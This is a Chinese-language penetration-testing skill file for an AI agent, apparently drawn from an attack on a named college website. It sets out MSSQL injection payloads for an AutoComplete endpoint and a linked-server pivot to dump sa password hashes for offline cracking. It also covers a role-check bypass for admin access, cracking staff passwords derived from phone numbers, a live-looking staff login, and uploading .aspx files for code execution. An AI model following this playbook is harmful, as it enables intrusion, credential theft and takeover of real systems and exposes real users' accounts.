---
name: mssql-sqli-escalation
description: "受限MSSQL注入(解析层墙/表名注入)诊断+链接服务器跃迁+登录哈希外带。"
version: 1.0.0
author: Hermes Agent
license: MIT
platforms: [windows, linux, macos]
metadata:
  hermes:
    tags: [penetration, sqli, mssql, linked-server, hash-exfiltration]
---

# MSSQL 受限注入诊断与跃迁

适用: 参数被拼进存储过程动态 SQL 的表名/列名位置（如 ASP.NET AutoComplete.asmx `contextKey`）、
解析层有硬约束（禁函数/WHERE/字符串拼接）的 MSSQL 注入点、以及需要从"只读"跃迁到"登录凭据/执行"的场景。

## 注入点形态（EduSuite/AutoComplete 模式）

- 端点: `/WebMethod/AutoComplete.asmx/GetCompletionList?prefixText=&count=100&contextKey=0|{子查询}|{列名}`
- contextKey 三段: 前缀|表表达式|列名，拼进存储过程动态 SQL:
  `SELECT TOP N {col} FROM {TableName} Where Name Like '%%'`
- 200 返回 XML `<string>` 列表; 500 返回 SQL 详细报错 = 免费 oracle（报错开启时）
- 常见解析层墙: 子查询内禁函数 / WHERE / 字符串拼接; LIKE 墙 `'%' + @prefix + '%'`，非空前缀挂
- 返回 varbinary 列 = base64 序列化（M_Login 密码列实测）→ 哈希可外带

## 三种报错签名 → 反推生成 SQL 形状（别猜，用报错当 oracle）

| 报错 | 含义 |
|------|------|
| `Incorrect syntax near the keyword 'Where'` | 子查询形式被拒（FROM 后拼接结果非法） |
| `Incorrect syntax near '%%'` | 裸表名/系统视图/兼容视图四段式挂（解析层墙） |
| `Unclosed quotation mark after the character string 'xxx Where Name Like '%%''` | 泄漏生成 SQL 尾部——直接反推存储过程模板; JOIN 等复杂子查询挂 |

第三种报错的尾部字符串是免费情报源，能直接看到存储过程怎么拼后缀。

## 形状控制变量实验（6 连测，间隔 sleep 2s）

1. `(SELECT 1 AS Name) x` — 纯子查询无表
2. `(SELECT TOP 3 name AS Name FROM [spt_values]) x` — 子查询+本地表
3. `[spt_values]` — 本地裸表名
4. `[DB].[dbo].[M_Staff]` — 本地两段
5. `[sql5063].[master].[dbo].[spt_values]` — 四段裸名
6. `[sql5063].[DB].[dbo].[M_Staff]` — 四段裸名用户表

结论模式: 裸表名可通 → 系统对象/其他租户库直接四段式打; 子查询可通 → 任意表达式（但函数被墙）。

## 链接服务器跃迁（只读 → 哈希）

- 链接服务器 + sa 登录 = 本地权限墙不存在: 四段式 `[server].[db].[schema].[table]` 直读
- 主目标: `[sql5063].[master].[sys].[sql_logins]` 的 `password_hash`（varbinary，sa 可读）
- 系统视图四段式常被链接服务器限制（报 near '%%'）→ 换兼容视图:
  `[sql5063].[master].[dbo].[sysxlogins]` / `[sql5063].[master].[dbo].[syslogins]`（password 列，旧格式）
- 拿到哈希 → 本地 hashcat 离线爆（零噪音）→ sa 明文 → 登 SQL 服务器执行命令（xp_cmdshell = 写操作，须先获批）
- 顺带: `[sql5063].[master].[sys].[servers]` 四段式读 = 找更多链接服务器（链式跳转）;
  `sys.databases` 四段式读 = 横向扩数据面（每台 SQL 常挂 1-3 个租户库）

### 先验证链接服务器是不是横向跳板（别假设）

实测打脸：sql5063 的 `sys.databases` 四段式读只返回 `DB_A6B40D_Ace + master + tempdb`（= 本地库的镜像对），
`sys.servers` 只有它自己（无链式跳转）。即**这个链接服务器只是本地库的镜像/备用，不是横向跳板**，上面没有别的租户库可读。
跃迁前先跑两条只读验证，别默认"链接服务器=横向"：
1. `[server].[master].[sys].[databases]` col=name → 看上面到底挂几个库（只有本地库镜像 = 镜像对，无横向价值）
2. `[server].[master].[sys].[servers]` col=name → 看有没有链式跳转（只有自己 = 无链式）

农场模型（site4now/smarterasp）：每租户独立 SQL 实例、无 mesh。拿到单个 sa 大概率只能管单台（及其镜像），
"通吃农场"依赖"sa 密码全场统一"这个未验证假设——别把破 sa 哈希当成必由之路。

## 红线

- 只读 SELECT 探测可自行进行; xp_cmdshell / 任何写/执行必须先获批
- 在线猜密码会锁账号（acecollege admin 被 8 次失败锁死 = 可见影响）→ 永远优先哈希离线爆破
- prefixText 参数是潜在次级注入面（非空前缀挂的机制值得单独验证），先测只读形态
- 多方向策略讨论: 先大白话讲清每条路子的机制/回报/风险，等用户拍板再跑探测（用户会中途喊停确认思路）

## EduSuite 应用层跃迁（比注入跃迁更短的路）

当注入点约束卡死（函数/WHERE/拼接被墙、sa 哈希读不出）时别死磕——EduSuite 类系统的**权限模型漏洞**常是更短的路：

- **权限模型只校验登录态不校验角色**：母版页 `AccountMaster` 只判 `Session["UserId"]` 是否为空；admin 判断 `UserTypeId ∈ {1,2}` 只用于菜单显示/隐藏，**不是鉴权**。普通员工登录后直连 admin 页面（EditStaff/ViewUserType/MenuAccess 等）全部 200 无鉴权。
- **员工密码 = 手机号哈希**：源码 `UpdateStaff`/新建员工无条件 `@Password = Encryption(StaffMobile)`，`Encryption = SHA1(UTF-16LE)+Base64`。读 `M_Staff.StaffMobile` 列算哈希可秒破普通员工密码（admin/citsadmin 例外，密码非手机号）。注意两列独立 `SELECT TOP` 读取**行序会错位**，对齐需 JOIN 或按 StaffId。
- **员工登录 → 提权/上传 → RCE**：用已破弱密码员工账号登录（`Login.aspx` WebForms POST，先 GET 拿 VIEWSTATE/EVENTVALIDATION），登录后 EditStaff 可重置 admin 密码（写操作）、CourseMenu 上传任意扩展名落 .aspx（写操作）。实测 satish/55555 登录成功且 admin 页面全可达。
- **上传点校验修正（别信 task3 的"路径穿越"）**：CourseMenu 的 `EditCourseMenu.aspx` 上传，Update 分支里 `hideCourseMenuId` 会被 `Convert.ToInt32()` 强转（非 int 直接抛异常，SaveAs 不执行），所以**路径穿越不可行**；Insert 分支文件名 = 自增 `CourseMenuID + "AceCordinator." + ext`。Slide/BulkData 同理：原文件名虽拼进路径，但前缀是自增 ID/时间戳，只能**任意扩展名**（无白名单）落 .aspx 到固定上传目录，不能穿越到 web 根外。落盘文件名（自增 ID / 秒级时间戳）可预测或爆破。
- 关键教训：**别默认"必须破 admin 密码"**。弱密码普通账号 + 无角色校验 = 实际 admin 权限，比调 UNION 读 sa 哈希短得多。

## 脚本骨架

```python
def sqli(subq, col="Name", prefix="", retries=4):
    ck = f"0|{subq}|{col}"
    # requests.get("http://target/WebMethod/AutoComplete.asmx/GetCompletionList",
    #              params={"prefixText": prefix, "count": 100, "contextKey": ck},
    #              proxies={"http":"http://127.0.0.1:7890","https":"http://127.0.0.1:7890"},
    #              timeout=30)
    # 200: re.findall(r"<string>(.*?)</string>", r.text)
    # 500: re.sub(r"<[^>]+>", "", r.text)[:140]  ← 错误 oracle
    # 失败 sleep 4s 重试（代理环境必需 proxies，否则 NETERR）
```

## 参考

- 实战来源: usc_rec 战役 acecollege.in（2026-08），工具与数据在 `D:\Pentest\渗透\usc_rec_菲律宾\`
